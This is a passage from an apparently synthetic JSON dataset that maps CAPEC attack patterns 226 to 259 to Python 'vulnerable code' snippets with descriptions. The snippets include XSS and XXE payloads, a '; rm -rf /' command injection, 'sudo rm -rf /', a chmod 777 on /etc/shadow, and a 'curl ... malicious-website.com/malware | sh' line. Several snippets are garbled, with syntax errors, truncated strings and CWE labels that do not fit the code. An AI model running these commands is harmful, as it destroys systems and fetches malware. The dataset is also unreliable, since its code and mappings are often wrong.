        "description": "This code snippet demonstrates the CAPEC of fingerprinting, where an adversary compares output from a target system to known indicators that uniquely identify specific details about the target. The code exposes sensitive system information to an unauthorized actor, violating CWE-200, CWE-497, CWE-1323, CWE-207, and CWE-1313. The get_system_info function collects sensitive system information, including the operating system, architecture, and environment variables, and sends it to an untrusted actor over the network, allowing the adversary to discover existing weaknesses in the target."
    },
    {
        "capec_id": "226",
        "capec_name": "Session Credential Falsification through Manipulation",
        "code_snippet": "import hashlib\nimport time\n\nclass SessionManager:\n    def __init__(self):\n        self.sessions = {}\n\n    def create_session(self, username, password):\n        # CWE-603: Use of Client-Side Authentication\n        # Authentication is performed on the client-side, and the server trusts the client\n        if hashlib.sha256((username + password).encode()).hexdigest() == 'fixed_hash_value':\n            session_id = hashlib.sha256(str(time.time()).encode()).hexdigest()\n            self.sessions[session_id] = username\n            return session_id\n        else:\n            return None\n\n    def validate_session(self, session_id):\n        # CWE-565: Reliance on Cookies without Validation and Integrity Checking\n        # The server does not validate the session ID\n        if session_id in self.sessions:\n            return True\n        else:\n            return False\n\n    def get_username(self, session_id):\n        # CWE-472: External Control of Assumed-Immutable Web Parameter\n        # The server trusts the session ID sent by the client\n        if session_id in self.sessions:\n            return self.sessions[session_id]\n        else:\n            return None\n\n# CWE-384: Session Fixation\n# An attacker can reuse an existing session ID\n# CWE-613: Insufficient Session Expiration\n# The session ID is not expired even after a long time\nmanager = SessionManager()\n\n# Create a session\nsession_id = manager.create_session('user', 'password')\n\n# Validate the session\nif manager.validate_session(session_id):\n    print('Session is valid')\nelse:\n    print('Session is invalid')\n\n# Get the username from the session ID\nusername = manager.get_username(session_id)\nif username:\n    print('Username:', username)\nelse:\n    print('Invalid session ID')",
        "description": "This code snippet demonstrates the CAPEC of manipulating an existing credential to gain access to a target application. It includes CWE-565, CWE-472, CWE-384, CWE-613, and CWE-603 vulnerabilities. The code creates a session manager that relies on client-side authentication, does not validate session IDs, and does not expire sessions. An attacker can reuse an existing session ID to gain unauthorized access to the application."
    },
    {
        "capec_id": "227",
        "capec_name": "Sustained Client Engagement",
        "code_snippet": "import time\n\ndef vulnerable_function(resource):\n    while True:\n        # CWE-400: Uncontrolled Resource Consumption\n        # CWE-770: Allocation of Resources Without Limits or Throttling\n        resource.allocate()\n        # CWE-406: Insufficient Control of Network Message Volume (Network Amplification)\n        send_network_request()\n        # CWE-1229: Creation of Emergent Resource\n        emergent_resource = create_emergent_resource()\n        # CWE-285: Improper Authorization\n        if not authorize_access():\n            continue\n        # Simulate resource engagement\n        time.sleep(10)\n\n# Example usage\nresource = Resource()\nvulnerable_function(resource)",
        "description": "This Python code snippet demonstrates a vulnerable function that continually engages a specific resource, keeping it tied up and unavailable to legitimate users. The function allocates resources without limits, sends network requests without controlling the volume, creates emergent resources, and lacks proper authorization checks, ultimately leading to resource exhaustion and denial of service."
    },
    {
        "capec_id": "228",
        "capec_name": "DTD Injection",
        "code_snippet": "import xml.etree.ElementTree as ET\n\ndef parse_xml(xml_string):\n    try:\n        ET.fromstring(xml_string)\n    except ET.ParseError as e:\n        print(f\"Error parsing XML: {e}\")\n\n# Vulnerable code: parsing untrusted XML with DTD\nxml_string = \"<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe 'file:///etc/passwd'>]><foo>&xxe;</foo>\"\nparse_xml(xml_string)",
        "description": "This Python code snippet demonstrates the vulnerability of XML Entity Expansion (CWE-776) and Improper Restriction of XML External Entity Reference (CWE-611) by parsing an untrusted XML string with a malicious DTD. The XML string contains an entity reference that attempts to read the contents of the /etc/passwd file, which can lead to resource depletion and information disclosure."
    },
    {
        "capec_id": "229",
        "capec_name": "Serialized Data Parameter Blowup",
        "code_snippet": "import xml.etree.ElementTree as ET\n\ndef parse_xml(xml_string):\n    root = ET.fromstring(xml_string)\n    for elem in root.iter():\n        if elem.tag == 'entity':\n            elem.text = elem.text * 1000000\n    return ET.tostring(root, encoding='unicode')\n\nxml_string = '<root><entity>evil entity</entity></root>' * 100000\nprint(parse_xml(xml_string))",
        "description": "This Python code snippet demonstrates a denial of service vulnerability through XML entity expansion. The parse_xml function takes an XML string, iterates over its elements, and expands the text of elements with the 'entity' tag by a large factor. The xml_string variable is crafted to contain many 'entity' elements, leading to excessive memory allocation and CPU usage when parsed. This code embodies CWE-770 (Allocation of Resources Without Limits or Throttling), CWE-611 (Improper Restriction of XML External Entity Reference), and CWE-74 (Improper Neutralization of Special Elements in Output Used by a Downstream Component)."
    },
    {
        "capec_id": "230",
        "capec_name": "Serialized Data with Nested Payloads",
        "code_snippet": "import xml.etree.ElementTree as ET\n\ndef parse_xml(xml_string):\n    try:\n        ET.fromstring(xml_string)\n    except ET.ParseError as e:\n        print(f\"Error parsing XML: {e}\")\n\nxml_string = '<!ENTITY a \"&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;\">\n<!ENTITY b \"&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;\">\n<p>&a;</p>'\n\nparse_xml(xml_string)",
        "description": "This Python code snippet demonstrates the CAPEC of XML Entity Expansion, which can lead to excessive memory consumption and CPU utilization. The code lacks proper XML validation (CWE-112) and input validation (CWE-20), allowing an adversary to inject malicious XML data. The recursive entity expansion can cause uncontrolled recursion (CWE-674) and allocation of resources without limits or throttling (CWE-770). The code also relies on machine-dependent data representation (CWE-1102), making it vulnerable to variations in data representation across different systems."
    },
    {
        "capec_id": "231",
        "capec_name": "Oversized Serialized Data Payloads",
        "code_snippet": "import xml.etree.ElementTree as ET\n\ndef parse_xml(xml_string):\n    try:\n        ET.fromstring(xml_string)\n    except ET.ParseError as e:\n        print(f\"Error parsing XML: {e}\")\n\n# Oversized XML payload\nxml_string = '<!' + 'a' * (1024 * 1024 * 10) + '-->\n\nparse_xml(xml_string)\n",
        "description": "This code snippet demonstrates the CAPEC of injecting oversized serialized data payloads into a parser. The CWEs embodied in this code include CWE-112 (Missing XML Validation), CWE-20 (Improper Input Validation), CWE-674 (Uncontrolled Recursion), CWE-770 (Allocation of Resources Without Limits or Throttling), and CWE-1102 (Reliance on Machine-Dependent Data Representation). The code accepts an oversized XML string without proper validation, which can lead to excessive resource allocation and potential arbitrary code execution."
    },
    {
        "capec_id": "233",
        "capec_name": "Privilege Escalation",
        "code_snippet": "import os\n\n# CWE-269: Improper Privilege Management\n# CWE-274: Improper Handling of Insufficient Privileges\n\ndef elevate_privileges():\n    try:\n        # Attempt to elevate privileges without proper checks\n        os.setuid(0)\n        print(\"Privileges elevated successfully\")\n    except Exception as e:\n        print(\"Error elevating privileges: \", e)\n\n# CWE-653: Improper Isolation or Compartmentalization\n# CWE-1264: Hardware Logic with Insecure De-Synchronization between Control and Data Channels\n# CWE-1311: Improper Translation of Security Attributes by Fabric Bridge\n\ndef insecure_operation():\n    # Perform an operation that requires high privileges without proper checks\n    try:\n        os.system(\"sudo rm -rf /\")\n    except Exception as e:\n        print(\"Error performing insecure operation: \", e)\n\n# Main function\nif __name__ == \"__main__\":\n    elevate_privileges()\n    insecure_operation()",
        "description": "This Python code snippet demonstrates the CAPEC of privilege escalation by exploiting weaknesses in privilege management, insufficient privilege handling, improper isolation, and insecure hardware logic. The code attempts to elevate privileges without proper checks, and then performs an operation that requires high privileges without proper authorization, leading to a potential security vulnerability."
    },
    {
        "capec_id": "234",
        "capec_name": "Hijacking a privileged process",
        "code_snippet": "import os\n\n# CWE-732: Incorrect Permission Assignment for Critical Resource\nos.chmod('/etc/shadow', 0o777)  # setting world writable permissions on a critical resource\n\n# CWE-648: Incorrect Use of Privileged APIs\nos.setuid(0)  # setting UID to 0 (root) without proper authorization\n\n# CWE-250: Execution with Unnecessary Privileges\nos.system('rm -rf /')  # executing a command with superuser privileges\n\n# CWE-114: Process Control\nos.system('curl http://malicious-website.com/malware | sh')  # executing commands from an untrusted source\n\n# CWE-271: Privilege Dropping / Lowering Errors\nos.setuid(1000)  # dropping privileges but still allowing an untrusted actor to execute code",
        "description": "This Python code snippet demonstrates the CAPEC of hijacking a process with elevated privileges to execute arbitrary code. It includes multiple CWEs: incorrect permission assignment for a critical resource, incorrect use of privileged APIs, execution with unnecessary privileges, process control, and privilege dropping/lowering errors. These vulnerabilities can be exploited by an attacker to gain elevated privileges and execute malicious code."
    },
    {
        "capec_id": "235",
        "capec_name": "DEPRECATED: Implementing a callback to system routine (old AWT Queue)",
        "code_snippet": "import threading\nimport time\nimport socket\n\nclass AuthenticationBypass:\n    def __init__(self):\n        self.static_token = None\n\n    def authenticate(self, token):\n        if self.static_token is None:\n            self.static_token = token\n        elif self.static_token == token:\n            return True\n        else:\n            return False\n\n    def start_thread(self):\n        def worker(token):\n            while True:\n                time.sleep(1)\n                if self.authenticate(token):\n                    print(\"Authentication successful\")\n                    break\n\n        thread = threading.Thread(target=worker, args=(\"static_token\",))\n        thread.start()\n\n    def ioctl_insufficient_access_control(self):\n        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        sock.connect((\"localhost\", 8080))\n        sock.send(b\"ioctl_call\")\n        response = sock.recv(1024)\n        print(response.decode())\n\nif __name__ == \"__main__\":\n    auth_bypass = AuthenticationBypass()\n    auth_bypass.start_thread()\n    auth_bypass.ioctl_insufficient_access_control()",
        "description": "This Python code snippet demonstrates a vulnerable code that embodies the main idea of the deprecated CAPEC attack pattern. It includes CWE-294: Authentication Bypass by Capture-replay, CWE-1058: Invokable Control Element in Multi-Thread Context with non-Final Static Storable or Member Element, and CWE-782: Exposed IOCTL with Insufficient Access Control. The code has a flawed authentication mechanism that can be bypassed by capturing and replaying the authentication token. It also uses a non-final static storable element and an IOCTL with insufficient access control, making it vulnerable to attacks."
    },
    {
        "capec_id": "236",
        "capec_name": "DEPRECATED: Catching exception throw/signal from privileged block",
        "code_snippet": "import signal\nimport socket\nimport threading\n\n# CWE-828: Signal Handler with Functionality that is not Asynchronous-Safe\ndef signal_handler(sig, frame):\n    # Non-asynchronous-safe code sequence\n    print('Signal handler invoked')\n    # CWE-391: Unchecked Error Condition\n    try:\n        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        sock.connect(('localhost', 8080))\n        sock.send(b'auth_request')\n        response = sock.recv(1024)\n        if response != b'auth_success':\n            # CWE-592: DEPRECATED: Authentication Bypass Issues\n            # CWE-294: Authentication Bypass by Capture-replay\n            print('Authentication failed. Trying to replay...')\n            sock.send(b'replay_auth_request')\n    except Exception as e:\n        # CWE-391: Unchecked Error Condition\n        pass\n\n# CWE-782: Exposed IOCTL with Insufficient Access Control\ndef ioctl_handler():\n    # IOCTL with insufficient access control\n    print('IOCTL handler invoked')\n\nsignal.signal(signal.SIGUSR1, signal_handler)\n\n# CWE-828: Signal Handler with Functionality that is not Asynchronous-Safe\nthreading.Thread(target=ioctl_handler).start()\n",
        "description": "This Python code snippet demonstrates a deprecated attack pattern that has been merged with CAPEC-30. It includes multiple CWEs, such as CWE-828 (Signal Handler with Functionality that is not Asynchronous-Safe), CWE-391 (Unchecked Error Condition), CWE-592 (DEPRECATED: Authentication Bypass Issues), CWE-294 (Authentication Bypass by Capture-replay), and CWE-782 (Exposed IOCTL with Insufficient Access Control). The code defines a signal handler with non-asynchronous-safe code, ignores exceptions, and demonstrates authentication bypass and IOCTL access control issues."
    },
    {
        "capec_id": "237",
        "capec_name": "Escaping a Sandbox by Calling Code in Another Language",
        "code_snippet": "import os\n\nclass SensitiveData:\n    def __init__(self, password):\n        self.password = password\n\n    class InnerClass:\n        def __init__(self, outer):\n            self.outer = outer\n\n        def expose_password(self):\n            return self.outer.password\n\ntry:\n    native_code = os.system('gcc -shared -o libnative.so -fPIC native_code.c')\n    if native_code != 0:\n        raise RuntimeError('Failed to compile native code. Error message: ' + str(native_code))\n\n    from ctypes import cdll\n    lib = cdll.LoadLibrary('./libnative.so')\n    lib.call_system_call()\nexcept Exception as e:\n    print('An error occurred: ' + str(e))\n",
        "description": "This Python code snippet demonstrates the CAPEC of escaping a sandbox by submitting malicious code of another language to obtain access to privileges that were not intentionally exposed. It uses CWE-693 (Protection Mechanism Failure) by incorrectly using a protection mechanism, CWE-111 (Direct Use of Unsafe JNI) by directly calling native code, CWE-492 (Use of Inner Class Containing Sensitive Data) by exposing sensitive data through an inner class, and CWE-537 (Java Runtime Error Message Containing Sensitive Information) by printing an error message that may contain sensitive information. The code loads a native C library using ctypes and calls a system call, which can potentially allow an attacker to escape the sandbox."
    },
    {
        "capec_id": "238",
        "capec_name": "DEPRECATED: Using URL/codebase / G.A.C. (code source) to convince sandbox of privilege",
        "code_snippet": "import os\n\n# CWE-551: Incorrect Behavior Order: Authorization Before Parsing and Canonicalization\n\ndef check_authorization(url):\n    if url.startswith('/admin'):  # Check for admin access\n        return True\n    return False\n\n# CWE-670: Always-Incorrect Control Flow Implementation\n\ndef parse_url(url):\n    if check_authorization(url):\n        # Always allow access, even if the URL is not fully parsed\n        return True\n    else:\n        # Incorrect control flow, always returns False\n        return False\n\n# CWE-424: Improper Protection of Alternate Path\n\ndef access_restricted_resource(url):\n    if parse_url(url):\n        # Access granted, even if the URL is not fully parsed\n        return os.system('echo \"Access granted\"')\n    else:\n        return os.system('echo \"Access denied\"')\n\n# CWE-1107: Insufficient Isolation of Symbolic Constant Definitions\n\nADMIN_ACCESS = '/admin'\n\n# CWE-657: Violation of Secure Design Principles\n\ndef main):\n    url = input('Enter URL: ')\n    access_restricted_resource(url)\n\nif __name__ == '__main__':\n    main()",
        "description": "This code snippet demonstrates a vulnerable Python code that embodies the main idea of the deprecated CAPEC. It includes CWE-551 by checking for authorization before fully parsing the URL, CWE-670 by always allowing access even if the URL is not fully parsed, CWE-424 by not protecting all possible paths to access restricted functionality, CWE-1107 by not isolating symbolic constant definitions, and CWE-657 by violating secure design principles."
    },
    {
        "capec_id": "239",
        "capec_name": "DEPRECATED: Subversion of Authorization Checks: Cache Filtering, Programmatic Security, etc.",
        "code_snippet": "import git\n\n# CWE-527: Exposure of Version-Control Repository to an Unauthorized Control Sphere\nrepo = git.Repo('./')\n\n# CWE-603: Use of Client-Side Authentication\nusername = input('Enter username: ')\npassword = input('Enter password: ')\n\nif username == 'admin' and password == 'password':\n    # CWE-602: Client-Side Enforcement of Server-Side Security\n    print('Authenticated!')\n    # CWE-217: DEPRECATED: Failure to Protect Stored Data from Modification\n    # CWE-766 and CWE-767: related to data modification\n    data = {'admin': 'password'}\n    with open('data.txt', 'w') as f:\n        f.write(str(data))\nelse:\n    print('Authentication failed!')\n\n# CWE-592: DEPRECATED: Authentication Bypass Issues\n# CWE-287: related to authentication bypass\n\n# CAPEC-207: Removing Important Client Functionality\n# The client-side authentication can be bypassed by modifying the client code\n# to omit the authentication check, allowing unauthorized access to the server.",
        "description": "This code snippet demonstrates a client-side authentication system that stores sensitive data in a version control repository. The client-side authentication can be bypassed by modifying the client code, allowing unauthorized access to the server. The code also exposes the version control repository to unauthorized actors and fails to protect stored data from modification."
    },
    {
        "capec_id": "240",
        "capec_name": "Resource Injection",
        "code_snippet": "import os\n\ndef access_file(file_path):\n    if os.path.exists(file_path):\n        with open(file_path, 'r') as f:\n            return f.read()\n    else:\n        return 'File not found'\n\n# Vulnerable code\nfile_path = input('Enter the file path: ')\nprint(access_file(file_path))",
        "description": "This Python code snippet demonstrates the CAPEC of exploiting weaknesses in input validation by manipulating resource identifiers. The CWEs involved are CWE-99, CWE-1285, CWE-1289, CWE-913, and CWE-20. The code takes user input for a file path and attempts to read the file without proper validation, allowing an attacker to access arbitrary files or inject malicious input."
    },
    {
        "capec_id": "241",
        "capec_name": "DEPRECATED: Code Injection",
        "code_snippet": "import os\n\n# CWE-477: Use of Obsolete Function\nos.popen('ls -l')\n\n# CWE-545: DEPRECATED: Use of Dynamic Class Loading (partial overlap with CWE-470)\nmod = __import__('os')\n\n# CWE-477: Use of Obsolete Function\nfrom urllib2 import urlopen\n\n# CWE-769: DEPRECATED: Uncontrolled File Descriptor Consumption (duplicate of CWE-774)\nfd = os.open('file.txt', os.O_RDWR)\n\n# CWE-592: DEPRECATED: Authentication Bypass Issues (redundant with CWE-287)\n# CWE-458: DEPRECATED: Incorrect Initialization (description duplicated CWE-454, name suggests abstract initialization problem)\n\n# Code Injection (CAPEC-242)\ndef inject_code():\n    user_input = input('Enter a command: ')\n    exec(user_input)\n\ninject_code()",
        "description": "This code snippet demonstrates the deprecated CAPEC pattern, which is a duplicate of CAPEC-242: Code Injection. It includes various CWEs, such as CWE-477: Use of Obsolete Function, CWE-545: DEPRECATED: Use of Dynamic Class Loading, CWE-769: DEPRECATED: Uncontrolled File Descriptor Consumption, CWE-592: DEPRECATED: Authentication Bypass Issues, and CWE-458: DEPRECATED: Incorrect Initialization. The code injection vulnerability is demonstrated through the use of the exec function, which executes user-inputted code."
    },
    {
        "capec_id": "242",
        "capec_name": "Code Injection",
        "code_snippet": "import os\n\ndef inject_code(user_input):\n    malicious_code = user_input + \"\\nprint('Malicious code executed!')\"\n    with open('injected_code.py', 'w') as f:\n        f.write(malicious_code)\n    os.system('python injected_code.py')\n\ninject_code(input('Enter your input: '))",
        "description": "This Python code snippet demonstrates code injection vulnerability (CWE-94) by allowing user input to modify the code of a Python script. The input is used to construct a new Python file, which is then executed using the os.system function. This allows an attacker to inject malicious code, such as a reverse shell or data exfiltration, into the application. The code also relates to CWE-506 (Embedded Malicious Code), CWE-74 (Improper Neutralization of Special Elements in Output Used by a Downstream Component), CWE-1173 (Improper Use of Validation Framework), and CWE-77 (Improper Neutralization of Special Elements used in a Command) as it fails to properly validate and neutralize user input, leading to code injection."
    },
    {
        "capec_id": "243",
        "capec_name": "XSS Targeting HTML Attributes",
        "code_snippet": "user_input = request.GET.get('user_input')\nhtml_output = '<a href=\\",
        "description": "This Python code snippet is vulnerable to cross-site scripting (XSS) due to improper neutralization of script in attributes in a web page (CWE-83). It takes user input from a GET request and injects it into a style attribute in an anchor tag without proper sanitization, allowing an attacker to inject malicious code. The code also relates to CWE-79 (Improper Neutralization of Input During Web Page Generation) and CWE-80 (Improper Neutralization of Script-Related HTML Tags in a Web Page)."
    },
    {
        "capec_id": "244",
        "capec_name": "XSS Targeting URI Placeholders",
        "code_snippet": "html = '<a href=\"data:text/html;base64,' + base64.b64encode('<script>alert(1)</script>').decode('utf-8') + '\">Click me!</a>'\nimg = '<img src=\"javascript:alert(1)\" />'\nprint('<html><body>' + html + img + '</body></html>')",
        "description": "This Python code snippet generates an HTML page with a malicious anchor tag and an IMG tag that contain cross-site scripting payloads. The anchor tag's HREF attribute contains a base64 encoded HTML content with an embedded script, and the IMG tag's SRC attribute contains a JavaScript URI scheme. When rendered in a browser, these tags can execute the malicious scripts, demonstrating the CAPEC and related CWEs."
    },
    {
        "capec_id": "245",
        "capec_name": "XSS Using Doubled Characters",
        "code_snippet": "import urllib.parse\n\n\ndef vulnerable_function(user_input):\n    # CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')\n    # CWE-80: Improper Neutralization of Script-Related HTML Tags in a Web Page (Basic XSS)\n    # CWE-85: Doubled Character XSS Manipulations\n    # CWE-86: Improper Neutralization of Invalid Characters in Identifiers in Web Pages\n    # CWE-1289: Improper Validation of Unsafe Equivalence in Input\n    encoded_input = urllib.parse.quote_plus(user_input)\n    html = f\"<html><body><p>{encoded_input}</p></body></html>\"\n    return html\n\nuser_input = \"<<script>alert('XSS')</script>\"\nprint(vulnerable_function(user_input))",
        "description": "This Python code snippet demonstrates a vulnerable function that fails to properly neutralize user-controlled input, allowing for a doubled character XSS attack. The function takes user input, encodes it using URI encoding, and injects it into an HTML page without proper validation or sanitization. An attacker can exploit this vulnerability by providing malicious input, such as '<<script>alert('XSS')</script>', which can lead to a cross-site scripting (XSS) attack."
    },
    {
        "capec_id": "246",
        "capec_name": "DEPRECATED: XSS Using Flash",
        "code_snippet": "from flask import Flask, request\napp = Flask(__name__)\n\n@app.route('/flash', methods=['GET', 'POST'])\ndef flash_param_injection():\n    if request.method == 'POST':\n        flash_param = request.form['flash_param']\n        # Incomplete denylist, allowing XSS variants to succeed (CWE-692)\n        if flash_param not in ['allowed_param1', 'allowed_param2']:\n            return 'Invalid flash parameter'\n        # Improper neutralization of alternate XSS syntax (CWE-87)\n        return '<script>alert(\"' + flash_param + '\");</script>'\n    return '<form action=\"/flash\" method=\"post\"><input type=\"text\" name=\"flash_param\" /></form>'\n\nif __name__ == '__main__':\n    app.run()\n",
        "description": "This code snippet demonstrates a vulnerable Flash parameter injection endpoint that is susceptible to stored XSS attacks. The code uses an incomplete denylist to filter user input, allowing malicious scripts to bypass the protection mechanism. Additionally, the code improperly neutralizes alternate XSS syntax, making it vulnerable to script injection attacks."
    },
    {
        "capec_id": "247",
        "capec_name": "XSS Using Invalid Characters",
        "code_snippet": "import flask\n\napp = flask.Flask(__name__)\n\n@app.route('/search', methods=['GET'])\ndef search():\n    query = flask.request.args.get('query')\n    # No input validation or sanitization\n    return '<h1>Search Results for ' + query + '</h1>'\n\nif __name__ == '__main__':\n    app.run()",
        "description": "This Python code snippet demonstrates a vulnerable web application that does not properly neutralize invalid characters in identifiers, allowing an adversary to inject malicious script tags and bypass input filtering. The search function retrieves user input from the 'query' parameter and directly embeds it into the HTML response without any validation or sanitization, making it vulnerable to XSS attacks."
    },
    {
        "capec_id": "248",
        "capec_name": "Command Injection",
        "code_snippet": "import subprocess\n\ndef execute_command(user_input):\n    command = \"ping -c 1 \" + user_input\n    subprocess.call(command, shell=True)\n\n# Example usage:\nuser_input = \"google.com; rm -rf /\"\nexecute_command(user_input)",
        "description": "This Python code snippet demonstrates command injection vulnerability (CWE-78). The `execute_command` function takes user input and concatenates it with the `ping` command. The `subprocess.call` function is then used to execute the command. However, if the user input contains malicious commands, such as `; rm -rf /`, they will be executed by the system, leading to unintended consequences."
    },
    {
        "capec_id": "249",
        "capec_name": "DEPRECATED: Linux Terminal Injection",
        "code_snippet": "import os\n\ndef execute_command(user_input):\n    cmd = \"ping \" + user_input + \" -c 1\"\n    os.system(cmd)\n\nuser_input = input(\"Enter the IP address: \")\nexecute_command(user_input)",
        "description": "This Python code snippet demonstrates command injection vulnerability (CWE-78) where user input is directly used to construct an OS command without proper sanitization, allowing an attacker to inject malicious commands."
    },
    {
        "capec_id": "250",
        "capec_name": "XML Injection",
        "code_snippet": "import xml.etree.ElementTree as ET\n\ndef get_user_data(username):\n    doc = ET.parse('users.xml')\n    root = doc.getroot()\n    xpath_query = \"//user[username='\" + username + \"']\"\n    return root.findall(xpath_query)\n\nusername = input('Enter your username: ')\nprint(get_user_data(username))",
        "description": "This Python code snippet is vulnerable to XML injection (CWE-91) and XPath injection (CWE-643) due to improper input validation (CWE-20) and neutralization of special elements (CWE-74 and CWE-707). The code uses user-controllable input to construct an XPath query, allowing an attacker to inject malicious XML data and potentially access unauthorized information or modify the database."
    },
    {
        "capec_id": "251",
        "capec_name": "Local Code Inclusion",
        "code_snippet": "import os\n\n# CWE-829: Inclusion of Functionality from Untrusted Control Sphere\n# CWE-1108: Excessive Reliance on Global Variables\n# CWE-506: Embedded Malicious Code\n# CWE-913: Improper Control of Dynamically-Managed Code Resources\n# CWE-1102: Reliance on Machine-Dependent Data Representation\n\nglobal_library_path = '/tmp/malicious_library.so'\n\ntry:\n    # Load arbitrary code files from the local machine\n    malicious_library = __import__(global_library_path)\n    malicious_library.malicious_function()\nexcept ImportError:\n    print('Failed to load malicious library')\n\n# CWE-913: Improper Control of Dynamically-Managed Code Resources\nmalicious_code = 'malicious_function = lambda: os.system(\"rm -rf /\")'\nexec(malicious_code)\n\n# CWE-1102: Reliance on Machine-Dependent Data Representation\nmachine_dependent_data = os.uname()[4]\nif machine_dependent_data == 'x86_64':\n    # Perform malicious action specific to x86_64 architecture\n    os.system('malicious_command')",
        "description": "This Python code snippet demonstrates the CAPEC of forcing an application to load arbitrary code files from the local machine. It includes CWE-829 by loading a malicious library from an untrusted control sphere, CWE-1108 by relying on global variables, CWE-506 by embedding malicious code, CWE-913 by improperly controlling dynamically-managed code resources, and CWE-1102 by relying on machine-dependent data representation. The code loads a malicious library, executes malicious code, and performs machine-dependent malicious actions."
    },
    {
        "capec_id": "252",
        "capec_name": "PHP Local File Inclusion",
        "code_snippet": "import os\n\nfilename = input('Enter the PHP file to include: ')\n\ntry:\n    with open(filename, 'r') as file:\n        php_code = file.read()\n        exec(php_code)\nexcept FileNotFoundError:\n    print('File not found!')",
        "description": "This Python code snippet demonstrates the CAPEC of loading and executing an arbitrary local PHP file on a target machine, which is vulnerable to CWE-829, CWE-98, CWE-646, CWE-616, and CWE-473. The code takes user input for the PHP file to include, reads the file, and executes the PHP code using the exec function. This can lead to arbitrary code execution, file inclusion, and other security vulnerabilities."
    },
    {
        "capec_id": "253",
        "capec_name": "Remote Code Inclusion",
        "code_snippet": "import urllib.request\n\nurl = 'http://malicious-website.com/malicious_code.py'\nlocal_file = 'malicious_code.py'\nurllib.request.urlretrieve(url, local_file)\n\nimport imp\nmalicious_module = imp.load_source('malicious_module', local_file)\nmalicious_module.malicious_function()",
        "description": "This Python code snippet downloads a Python file from a remote location and executes it, without verifying the origin and integrity of the code. This allows an attacker to force the application to load arbitrary code files from a remote location, potentially leading to the execution of malicious code."
    },
    {
        "capec_id": "254",
        "capec_name": "DEPRECATED: DTD Injection in a SOAP Message",
        "code_snippet": "import xml.etree.ElementTree as ET\n\ndef parse_xml(xml_string):\n    try:\n        root = ET.fromstring(xml_string)\n        # No validation or restriction on the DTD\n        return root\n    except ET.ParseError as e:\n        print(f\"Error parsing XML: {e}\")\n\n# Example usage\nxml_string = \"<?xml version='1.0' encoding='ISO-8859-1'?><!DOCTYPE foo SYSTEM 'http://example.com/evil.dtd'><bar>hello</bar>\"\nparse_xml(xml_string)",
        "description": "This Python code snippet demonstrates a vulnerable XML parser that does not restrict or validate the Document Type Definition (DTD) referenced in the XML input. This allows an attacker to inject a malicious DTD, potentially leading to XML Entity Expansion attacks (CWE-776) or exposure of sensitive information (CWE-651). The code also lacks proper error handling, which could lead to information exposure through debug log files (CWE-534) or server log files (CWE-533)."
    },
    {
        "capec_id": "256",
        "capec_name": "SOAP Array Overflow",
        "code_snippet": "import xml.etree.ElementTree as ET\n\ndef process_soap_request(xml_string):\n    root = ET.fromstring(xml_string)\n    array_length = int(root.find('array_length').text)\n    array_data = root.find('array_data').text\n    array = [0] * array_length\n    for i in range(len(array_data)):\n        array[i] = array_data[i]\n    return array\n\n# Example usage\nxml_string = '<soap:Envelope><array_length>5</array_length><array_data>0123456789</array_data></soap:Envelope>'\nprocess_soap_request(xml_string)",
        "description": "This Python code snippet demonstrates a vulnerable SOAP request processor that is susceptible to a buffer overflow attack. The processor trusts the specified array length and attempts to read the entire data set into a buffer of that size, without checking for inconsistencies. This can lead to a buffer overflow if the actual length of the array data exceeds the specified length."
    },
    {
        "capec_id": "257",
        "capec_name": "DEPRECATED: Abuse of Transaction Data Structure",
        "code_snippet": "import os\n\n# CWE-766: Stored Data from Modification\nunprotected_data = {'username': 'admin', 'password': 'password123'}\n\n# CWE-493: Failure to Provide Confidentiality for Stored Data\nunencrypted_password = 'password123'\n\n# CWE-532: Information Exposure Through Log Files\nlog_file = open('debug.log', 'w')\nlog_file.write('Username: ' + unprotected_data['username'] + '\\nPassword: ' + unencrypted_password + '\\n')\nlog_file.close()\n\n# CWE-287: Improper Authentication\ndef authenticate(username, password):\n    if username == 'admin' and password == 'password123':\n        return True\n    else:\n        return False\n\n# CWE-767: Confidentiality and Integrity Violations\ndef modify_stored_data():\n    os.system('echo \"Username: hacker\\nPassword: hacked\" > stored_data.txt')\n\n# Authentication Bypass\nif authenticate('admin', 'password123'):\n    print('Authenticated!')\nelse:\n    print('Authentication failed!')\n\nmodify_stored_data()\n",
        "description": "This code snippet demonstrates a deprecated CAPEC attack pattern that incorporates multiple weaknesses, including failure to protect stored data from modification, failure to provide confidentiality for stored data, information exposure through log files, improper authentication, and confidentiality and integrity violations. The code stores sensitive data in plaintext, logs sensitive information to a debug file, and has an authentication mechanism that can be easily bypassed. Additionally, the code allows an attacker to modify stored data, further compromising the system's security."
    },
    {
        "capec_id": "258",
        "capec_name": "DEPRECATED: Passively Sniffing and Capturing Application Code Bound for an Authorized Client During Dynamic Update",
        "code_snippet": "import socket\nimport hashlib\n\n# CWE-294: Authentication Bypass by Capture-replay\n\n# Client-side authentication\nusername = 'admin'\npassword = 'password'\n\n# Send authentication request to server\nsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\nsock.connect(('localhost', 8080))\nauth_request = f'{{\"username\":\"{username}\",\"password\":\"{hashlib.sha256(password.encode()).hexdigest()}\"}}'\nsock.send(auth_request.encode())\n\n# CWE-603: Use of Client-Side Authentication\n# Server-side authentication is bypassed by modifying the client code\n# to omit the authentication check\n\n# CWE-589: Call to Non-ubiquitous API\n# Using a non-ubiquitous API function that may not exist on all versions of the target platform\ntry:\n    import win32api\n    win32api.MessageBox(0, 'Authentication successful!', 'Success')\nexcept ImportError:\n    print('Error: win32api not found')\n",
        "description": "This code snippet demonstrates a vulnerable client-server application that performs authentication on the client-side and sends the authentication request to the server. The server-side authentication is bypassed by modifying the client code to omit the authentication check. Additionally, the code uses a non-ubiquitous API function that may not exist on all versions of the target platform, which could cause portability problems or inconsistencies."
    },
    {
        "capec_id": "259",
        "capec_name": "DEPRECATED: Passively Sniffing and Capturing Application Code Bound for an Authorized Client During Patching",
